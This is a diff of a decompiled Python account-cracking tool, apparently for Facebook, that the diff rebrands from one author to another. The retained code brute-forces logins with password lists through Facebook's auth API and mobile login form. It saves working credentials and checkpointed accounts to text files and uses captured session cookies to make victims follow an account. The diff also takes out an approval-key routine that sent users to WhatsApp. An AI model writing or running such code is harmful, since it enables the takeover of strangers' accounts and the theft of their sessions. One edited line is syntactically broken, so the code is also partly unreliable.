@@ -1,4 +1,4 @@
-# Decompile by TAHOSIN 
+# Decompile by 𝐘𝐎𝐔 
 # Time Succes decompile : 2023-04-01 14:00:33.945975
 
 import os
@@ -50,7 +50,7 @@ B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
 N = '\x1b[0m'    # WARNA MATI
-my_color = [
+my_color = [SkyBlue]
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
 
@@ -103,9 +103,8 @@ def logo():
              \033[1;93m▇▇➣    \033[1;91mAUTHOR   : D4DY-M4H1N        \033[1;93m▇▇
              \033[1;93m▇▇➣    \033[1;94mGITHUB   : D4DY-M4H1N        \033[1;93m▇▇
              \033[1;93m▇▇➣    \033[1;93mFACEBOOK : D4DY-M4H1N        \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801616406924     \033[1;93m▇▇
-             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS FREE          \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;94mGIVE ME 300 tk FOR APRVAL     \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801929974678     \033[1;93m▇▇
+             \033[1;93m▇▇➣       \033[1;91m𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐈𝐒 𝐅𝐑𝐄𝐄          \033[1;93m▇▇
              \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
              
 
@@ -128,41 +127,7 @@ def reg():
         time.sleep(2)
         bsn_menu()
     else:
-        os.system('clear')
-        os.system('xdg-open https://www.facebook.com/d4dy.m4h1n')
-        logo()
-        print('')
-        print ('               \tApproved Not Detected')
-        print ('')
-        print("            \033[1;97mTHIS TOOL IS FREE YOU NEED TO GET APPROVED FIRST")
-        print ('               \033[1;97mYOUR KEY : ' + to)
-        print("               COPY AND SEND KEY TO ADMIN")
-        name = input("               YOUR NAME : ")
-        input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
-        time.sleep(3.5)
-        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
-        os.system('am start https://wa.me/+8801616406924?text=' + tks)
-        reg()
-
-def reg2():
-    os.system('clear')
-    logo()
-    print('')
-    print ('\tApproval Not Detected')
-    print('')
-    id = uuid.uuid4().hex[:50]
-    print("            \033[1;97mTHIS TOOL IS FREE YOU NEED TO GET APPROVED FIRST")
-    print ('               \033[1;97mYOUR KEY : ' + id)
-    print("               COPY AND SEND KEY TO ADMIN")
-    name = input("               YOUR NAME : ")
-    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
-    time.sleep(3.5)
-    tks = 'Dear%20MAHDI-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
-    os.system('am start https://wa.me/+8801616406924?text=' + tks)
-    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
-    sav.write(id)
-    sav.close()
-    reg()
+        
 
 
 
@@ -197,7 +162,7 @@ def hasil(OK,cp):
         print(' Your Process Complete...')
         print('----------------------------------------------')
         print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
-        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
+        print(' [%s+%s] \033[1;97mFUCK CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
         print('----------------------------------------------')
         input(f"\n\033[1;97m Press Enter To Go Back ")
         bsn_menu()
@@ -256,7 +221,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write(f'\r [FAHIM] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+            sys.stdout.write(f'\r [M4H1N] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -264,10 +229,10 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-MAHDI] %s | %s ' % (user,pw))
+                print('\r [OK-M4H1N] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
-                open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                open('M4H1N-ok.txt' , 'a').write('%s\n' % wrt)
                 break
             elif "www.facebook.com" in p["error_msg"]:
                 try:
@@ -275,10 +240,10 @@ class __bsn__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-M4H1N] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('M4H1N-cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -286,10 +251,10 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;91m[CP-M4H1N] %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
-                open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                open('M4H1N-cp.txt' , 'a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -297,7 +262,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r [MAHDI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [M4H1N] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -347,10 +312,10 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-MAHDI] {user} | {pw}')
+                    print(f'\r{H} [OK-M4H1N] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                    open('M4H1N-ok.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -359,20 +324,20 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[CP-M4H1N] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                        open('M4H1N-cp.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-M4H1N] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('M4H1N-cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
